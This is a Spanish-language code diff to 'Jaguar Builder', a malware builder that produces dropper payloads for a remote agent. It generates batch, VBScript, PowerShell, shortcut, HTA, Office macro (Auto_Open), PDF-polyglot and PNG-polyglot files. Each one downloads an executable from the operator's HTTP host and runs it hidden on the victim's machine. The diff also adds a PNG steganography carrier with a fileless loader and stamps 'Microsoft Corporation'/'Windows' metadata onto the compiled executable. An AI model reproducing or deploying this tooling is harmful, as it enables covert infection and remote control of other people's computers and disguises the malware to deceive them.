@@ -3,12 +3,12 @@
 
 Cadena de ofuscacion/compilacion del exe:
   1) PyArmor  -> ofusca el agente
-  2) Nuitka   -> compila (recomendado)     [--windows-console-mode=disable]
+  2) Nuitka   -> compila (recomendado)
   3) PyInstaller -> fallback
 
-Los payloads de "documento/script" (.bat/.vbs/.ps1/.lnk/.hta/.pdf/.png/.bas)
-son DROPPERS: descargan el exe por HTTP y lo ejecutan OCULTO. No requieren
-Python en la victima. Todos llevan fallback a pythonw agente.py si existiera.
+Los payloads de script son DROPPERS: descargan el exe por HTTP y lo ejecutan
+OCULTO. Si no hay exe, el fallback descarga el .py (con host incrustado) y lo
+corre con pythonw. Todos los payloads llevan el host/fallback embebidos.
 """
 import functools
 import os
@@ -78,6 +78,40 @@ class Constructor:
                 return c
         self.log(f"[builder] ERROR: no encontré agente.py (busqué en {self.raiz})")
         return None
+    
+    def generar_png_stego(self):
+        """PNG real (logo) con el exe anexado tras IEND + loader .cmd fileless."""
+        carrier = None
+        for c in (os.path.join(self.raiz, "jaguar", "ui", "jaguar.png"),
+                  os.path.join(self.raiz, "img", "jaguar.png")):
+            if os.path.isfile(c):
+                carrier = c
+                break
+        png = open(carrier, "rb").read() if carrier else self._png_minimo()
+
+        exe = self._out(self.nombre + ".exe")
+        datos = open(exe, "rb").read() if os.path.isfile(exe) else b""
+        if not datos:
+            self.log("[builder] aviso: no hay exe; genera el .exe antes del stego")
+
+        MAGIC = b"JAGUARSTEGO"
+        blob = png + datos + MAGIC + len(datos).to_bytes(8, "little")
+        self._escribir(self._out(self.nombre + ".png"), blob, binario=True)
+
+        loader = "\r\n".join([
+            "@echo off",
+            'set "IMG=%~dp0%~n0"',
+            'powershell -NoP -C "$b=[IO.File]::ReadAllBytes($env:IMG);'
+            "$m=[Text.Encoding]::ASCII.GetBytes('JAGUARSTEGO');"
+            "$i=$b.Length-8; $n=[BitConverter]::ToInt64($b,$i);"
+            "$x=New-Object byte[] $n; [Array]::Copy($b,$i-$n,$x,0,$n);"
+            "$d=Join-Path $env:TEMP 'jaguar_stego.exe';"
+            "[IO.File]::WriteAllBytes($d,$x); Start-Process $d -WindowStyle Hidden\"",
+            "exit /b",
+        ]) + "\r\n"
+        self._escribir(self._out(self.nombre + ".png.cmd"), loader)
+        self.log("[builder] png estego listo (payload embebido, imagen visible normal)")
+        return self._out(self.nombre + ".png")
 
     @staticmethod
     def _ip_local():
@@ -92,7 +126,6 @@ class Constructor:
             s.close()
 
     def _host_url(self):
-        """Host usable en una URL: si es 0.0.0.0/vacio usa la IP local de LAN."""
         h = (self.host or "").strip()
         if h in ("", "0.0.0.0", "127.0.0.1"):
             h = self.fallback or h or "127.0.0.1"
@@ -102,7 +135,7 @@ class Constructor:
         return f"http://{self._host_url()}:{self.puerto_http}/{self.nombre}.exe"
 
     def _url_py(self):
-        return f"http://{self._host_url()}:{self.puerto_http}/agente.py"
+        return f"http://{self._host_url()}:{self.puerto_http}/{self.nombre}.py"
 
     def _out(self, nombre):
         return os.path.join(self.dist, nombre)
@@ -115,12 +148,20 @@ class Constructor:
         self.log(f"[builder] creado: {os.path.basename(ruta)}")
         return ruta
 
-    def _copiar_agente(self):
-        try:
-            if os.path.isfile(self.agente):
-                shutil.copy2(self.agente, self._out("agente.py"))
-        except Exception as e:
-            self.log(f"[builder] no pude copiar agente.py: {e}")
+    def _cabecera_arranque(self):
+        """Prefijo que incrusta host/puerto/fallback en un .py autónomo."""
+        return (
+            "# -*- coding: utf-8 -*-\n"
+            "# --- configuracion incrustada por Jaguar Builder ---\n"
+            "import os as _os, sys as _sys\n"
+            f"_HOST = {self.host!r}\n"
+            f"_PORT = {self.puerto!r}\n"
+            f"_HOST2 = {self.fallback!r}\n"
+            "_os.environ.setdefault('JAGUAR_HOST', _HOST)\n"
+            "_os.environ.setdefault('JAGUAR_PORT', _PORT)\n"
+            "_os.environ.setdefault('JAGUAR_HOST2', _HOST2)\n"
+            "_sys.argv = [_sys.argv[0], _HOST, _PORT, _HOST2]\n"
+        )
 
     @staticmethod
     def _sello():
@@ -175,9 +216,17 @@ class Constructor:
 
     # ------------------------------------------------------------------ icono
     def _icono_ico(self):
-        """Devuelve una ruta .ico para el exe (la dada, o jaguar.png convertida)."""
         if self.icono and os.path.isfile(self.icono):
-            return os.path.abspath(self.icono)
+            if self.icono.lower().endswith(".ico"):
+                return os.path.abspath(self.icono)
+            try:
+                from PIL import Image
+                destino = os.path.join(self.dist, self.nombre + ".ico")
+                Image.open(self.icono).convert("RGBA").save(
+                    destino, sizes=[(16, 16), (32, 32), (48, 48), (64, 64), (256, 256)])
+                return destino
+            except Exception as e:
+                self.log(f"[builder] no pude convertir icono dado: {e}")
         for cand in ("jaguar.ico", "jaguar.png"):
             p = os.path.join(self.raiz, "jaguar", "ui", cand)
             if not os.path.isfile(p):
@@ -364,21 +413,22 @@ class Constructor:
                "--onefile",
                "--assume-yes-for-downloads",
                "--remove-output",
-               "--windows-console-mode=disable",
                "--enable-plugin=numpy",
                "--include-package=PIL",
                "--include-package=cv2",
-               "--include-module=winreg",
-               "--include-module=agente_jaguar",
-               "--company-name=Microsoft Corporation",
-               "--product-name=Windows",
-               f"--file-description={self.nombre}",
-               "--file-version=1.0.0.0",
-               "--product-version=1.0.0.0",
-               "--copyright=Microsoft Corporation",
-               f"--output-filename={self.nombre}.exe",
+               f"--output-filename={self.nombre}" + (".exe" if ES_WIN else ""),
                f"--output-dir={dist_tmp}"]
-        for m in DEPS_STDLIB + ["subprocess", "winreg"]:
+        if ES_WIN:
+            cmd += ["--windows-console-mode=disable",
+                    "--include-module=winreg",
+                    "--company-name=Microsoft Corporation",
+                    "--product-name=Windows",
+                    f"--file-description={self.nombre}",
+                    "--file-version=1.0.0.0",
+                    "--product-version=1.0.0.0",
+                    "--copyright=Microsoft Corporation"]
+        cmd.append("--include-module=agente_jaguar")
+        for m in DEPS_STDLIB + (["subprocess", "winreg"] if ES_WIN else ["subprocess"]):
             cmd.append(f"--include-module={m}")
         if deps:
             cmd.append(f"--include-module={deps}")
@@ -431,6 +481,9 @@ class Constructor:
 
     def _compilar_pyinstaller(self, dist_tmp, work, runtime, deps, intentos=3):
         exe = os.path.join(dist_tmp, self.nombre + (".exe" if ES_WIN else ""))
+        ocultos = ["PIL", "PIL.Image", "PIL.ImageGrab", "cv2"] + DEPS_STDLIB + ["subprocess"]
+        if ES_WIN:
+            ocultos.append("winreg")
         salida = ""
         for i in range(intentos):
             cmd = [sys.executable, "-m", "PyInstaller", "--noconfirm",
@@ -440,8 +493,7 @@ class Constructor:
                    "--workpath", work,
                    "--specpath", work,
                    "--paths", self.build]
-            for m in ["PIL", "PIL.Image", "PIL.ImageGrab", "cv2", "winreg"] \
-                    + DEPS_STDLIB + ["subprocess"]:
+            for m in ocultos:
                 cmd += ["--hidden-import", m]
             if deps:
                 cmd += ["--hidden-import", deps]
@@ -521,21 +573,25 @@ class Constructor:
 
     # ------------------------------------------------------------------ droppers
     def _bat_compacto(self):
-        """Batch minimo (para polyglot PDF)."""
+        """Batch minimo (para polyglot PDF). Sin consola residual."""
         return (
             "@echo off\r\n"
             f"set U={self._url_exe()}\r\n"
             f"set D=%TEMP%\\{self.nombre}.exe\r\n"
             'powershell -NoP -C "(New-Object Net.WebClient).DownloadFile(\'%U%\',\'%D%\')"'
             " >nul 2>&1\r\n"
-            'start "" "%D%" & exit /b\r\n'
+            'if exist "%D%" (start "" "%D%" & exit /b)\r\n'
+            f"set PY={self._url_py()}\r\n"
+            'set PYD=%TEMP%\\jaguar_py.py\r\n'
+            'powershell -NoP -C "try{Invoke-WebRequest -UseBasicParsing -Uri \'%PY%\' -OutFile \'%PYD%\'}catch{}" >nul 2>&1\r\n'
+            'where pythonw >nul 2>&1 && start "" pythonw "%PYD%"\r\n'
+            "exit /b\r\n"
         )
 
     def generar_bat(self):
-        self._copiar_agente()
+        """Un solo .bat autonomo: exe por HTTP, fallback .py con host incrustado."""
         exe_url = self._url_exe()
         py_url = self._url_py()
-        host_arg = self.host or "127.0.0.1"
         L = [
             "@echo off",
             "setlocal enableextensions",
@@ -543,21 +599,19 @@ class Constructor:
             f'set "DEST=%TEMP%\\{self.nombre}.exe"',
             'powershell -NoProfile -ExecutionPolicy Bypass -Command "try{[Net.ServicePointManager]::SecurityProtocol=3072;Invoke-WebRequest -UseBasicParsing -Uri \'%URL%\' -OutFile \'%DEST%\'}catch{}" >nul 2>&1',
             'if exist "%DEST%" (start "" "%DEST%" & exit /b)',
-            "rem --- fallback: agente.py con Python ---",
+            "rem --- fallback: .py con host incrustado (necesita Python en la victima) ---",
             f'set "PYURL={py_url}"',
             'set "PYDEST=%TEMP%\\jaguar_agente.py"',
             'powershell -NoProfile -Command "try{Invoke-WebRequest -UseBasicParsing -Uri \'%PYURL%\' -OutFile \'%PYDEST%\'}catch{}" >nul 2>&1',
-            'where pythonw >nul 2>&1 && start "" pythonw "%PYDEST%" '
-            f'{host_arg} {self.puerto} {self.fallback}',
+            'where pythonw >nul 2>&1 && start "" pythonw "%PYDEST%"',
             "exit /b",
         ]
         return self._escribir(self._out(self.nombre + ".bat"), "\r\n".join(L) + "\r\n")
 
     def generar_vbs(self):
-        self._copiar_agente()
         vbs = "\r\n".join([
             "Option Explicit",
-            "Dim url, dest, http, st, sh",
+            "Dim url, dest, http, st, sh, pyurl, pydest",
             f'url = "{self._url_exe()}"',
             'Set sh = CreateObject("WScript.Shell")',
             f'dest = sh.ExpandEnvironmentStrings("%TEMP%") & "\\{self.nombre}.exe"',
@@ -571,23 +625,39 @@ class Constructor:
             "  st.Type = 1 : st.Open : st.Write http.responseBody",
             "  st.SaveToFile dest, 2 : st.Close",
             '  sh.Run """" & dest & """", 0, False',
+            "Else",
+            "  Err.Clear",
+            f'  pyurl = "{self._url_py()}"',
+            '  pydest = sh.ExpandEnvironmentStrings("%TEMP%") & "\\jaguar_agente.py"',
+            '  Set http = CreateObject("MSXML2.XMLHTTP")',
+            '  http.Open "GET", pyurl, False',
+            "  http.Send",
+            "  If http.Status = 200 Then",
+            '    Set st = CreateObject("ADODB.Stream")',
+            "    st.Type = 1 : st.Open : st.Write http.responseBody",
+            "    st.SaveToFile pydest, 2 : st.Close",
+            '    sh.Run "pythonw """ & pydest & """", 0, False',
+            "  End If",
             "End If",
         ]) + "\r\n"
         return self._escribir(self._out(self.nombre + ".vbs"), vbs)
 
     def generar_ps1(self):
-        self._copiar_agente()
         ps = "\r\n".join([
             "$ErrorActionPreference='SilentlyContinue'",
             f"$url='{self._url_exe()}'",
             f"$dest=Join-Path $env:TEMP '{self.nombre}.exe'",
             "try{[Net.ServicePointManager]::SecurityProtocol=3072; Invoke-WebRequest -UseBasicParsing -Uri $url -OutFile $dest}catch{}",
             "if (Test-Path $dest) { Start-Process -FilePath $dest -WindowStyle Hidden }",
+            "else {",
+            f"  $py=Join-Path $env:TEMP 'jaguar_agente.py'",
+            f"  try{{Invoke-WebRequest -UseBasicParsing -Uri '{self._url_py()}' -OutFile $py}}catch{{}}",
+            "  if (Test-Path $py) { Start-Process pythonw -ArgumentList $py -WindowStyle Hidden }",
+            "}",
         ]) + "\r\n"
         return self._escribir(self._out(self.nombre + ".ps1"), ps)
 
     def generar_lnk(self):
-        self._copiar_agente()
         destino = self._out(self.nombre + ".lnk")
         comando = (f'powershell -NoP -W Hidden -C "iwr \'{self._url_exe()}\' -OutFile '
                    f'$env:TEMP\\{self.nombre}.exe; Start-Process $env:TEMP\\{self.nombre}.exe"')
@@ -614,7 +684,7 @@ class Constructor:
         contenido = (
             'Set sh = CreateObject("WScript.Shell")\r\n'
             f'Set l = sh.CreateShortcut("{destino}")\r\n'
-            f'l.TargetPath = "{os.path.join(os.environ.get("WINDIR", r"C:\\Windows"), "System32", "cmd.exe")}"\r\n'
+            f'l.TargetPath = "{os.path.join(os.environ.get("WINDIR", r"C:\Windows"), "System32", "cmd.exe")}"\r\n'
             f'l.Arguments = "{args}"\r\n'
             f'l.WorkingDirectory = "{self.dist}"\r\n'
             "l.WindowStyle = 7\r\n"
@@ -627,7 +697,6 @@ class Constructor:
         return destino
 
     def generar_hta(self):
-        self._copiar_agente()
         hta = (
             "<html><head><title>Windows Update</title>\r\n"
             '<HTA:APPLICATION ID="j" BORDER="none" SHOWINTASKBAR="no" '
@@ -655,13 +724,11 @@ class Constructor:
         return self._escribir(self._out(self.nombre + ".hta"), hta)
 
     def generar_png_polyglot(self):
-        """PNG valido + batch anexado. Emite .png y .png.cmd."""
-        self._copiar_agente()
+        """PNG valido + batch anexado. El EJECUTABLE es el .png.cmd."""
         png = self._png_minimo()
         cola = b"\r\n" + self._bat_compacto().encode("utf-8")
         self._escribir(self._out(self.nombre + ".png"), png + cola, binario=True)
-        self._escribir(self._out(self.nombre + ".png.cmd"), png + cola, binario=True)
-        return self._out(self.nombre + ".png")
+        return self._escribir(self._out(self.nombre + ".png.cmd"), png + cola, binario=True)
 
     @staticmethod
     def _png_minimo():
@@ -674,12 +741,11 @@ class Constructor:
         return sig + chunk(b"IHDR", ihdr) + chunk(b"IDAT", idat) + chunk(b"IEND", b"")
 
     def generar_pdf(self):
-        """PDF + batch embebido (polyglot). Emite .pdf y .pdf.cmd."""
+        """PDF + batch embebido. El EJECUTABLE es el .pdf.cmd."""
         bat = self._bat_compacto().encode("utf-8")
         pdf = self._pdf_minimo("Jaguar - Windows Update", prefijo=bat)
         self._escribir(self._out(self.nombre + ".pdf"), pdf, binario=True)
-        self._escribir(self._out(self.nombre + ".pdf.cmd"), pdf, binario=True)
-        return self._out(self.nombre + ".pdf")
+        return self._escribir(self._out(self.nombre + ".pdf.cmd"), pdf, binario=True)
 
     @staticmethod
     def _pdf_minimo(texto, prefijo=b""):
@@ -709,8 +775,6 @@ class Constructor:
         return bytes(out)
 
     def generar_macro(self):
-        """VBA (.bas) autonoma: descarga y ejecuta el exe con WScript.Shell."""
-        self._copiar_agente()
         macro = (
             "Sub Auto_Open()\r\n"
             "    Dim x As Object, s As Object, sh As Object\r\n"
@@ -733,19 +797,26 @@ class Constructor:
         return self._escribir(self._out(self.nombre + "_macro.bas"), macro)
 
     def generar_py(self):
-        self._copiar_agente()
-        return self._out("agente.py")
+        """Un .py AUTONOMO con el host incrustado (conecta en cualquier red)."""
+        try:
+            with open(self.agente, encoding="utf-8", errors="replace") as f:
+                fuente = f.read()
+        except Exception as e:
+            self.log(f"[builder] ERROR py: {e}")
+            return None
+        return self._escribir(self._out(self.nombre + ".py"),
+                              self._cabecera_arranque() + "\n" + fuente)
 
     # ------------------------------------------------------------------ todo
     def generar_todo(self, tipos=None):
-        tipos = tipos or ["exe", "bat", "vbs", "ps1", "lnk", "hta", "pdf", "png",
-                          "macro", "py"]
+        tipos = tipos or ["exe", "py", "bat", "vbs", "ps1", "lnk", "hta", "pdf",
+                          "png", "macro"]
         res = {}
         mapa = {
-            "exe": self.generar_exe, "bat": self.generar_bat, "vbs": self.generar_vbs,
-            "ps1": self.generar_ps1, "lnk": self.generar_lnk, "hta": self.generar_hta,
-            "png": self.generar_png_polyglot, "pdf": self.generar_pdf,
-            "macro": self.generar_macro, "py": self.generar_py,
+            "exe": self.generar_exe, "py": self.generar_py, "bat": self.generar_bat,
+            "vbs": self.generar_vbs, "ps1": self.generar_ps1, "lnk": self.generar_lnk,
+            "hta": self.generar_hta, "png": self.generar_png_polyglot,"png_stego": self.generar_png_stego,
+            "pdf": self.generar_pdf, "macro": self.generar_macro,
         }
         for t in tipos:
             fn = mapa.get(t)
@@ -756,6 +827,8 @@ class Constructor:
             except Exception as e:
                 self.log(f"[builder] ERROR generando {t}: {e}")
                 res[t] = None
+        self.log(f"[builder] host de retorno = {self._host_url()} | fallback LAN = {self.fallback}")
+        self.log("[builder] recuerda: deja '🌐 Servir dist' ACTIVO para que los droppers conecten")
         return res
 
     # ------------------------------------------------------------------ http
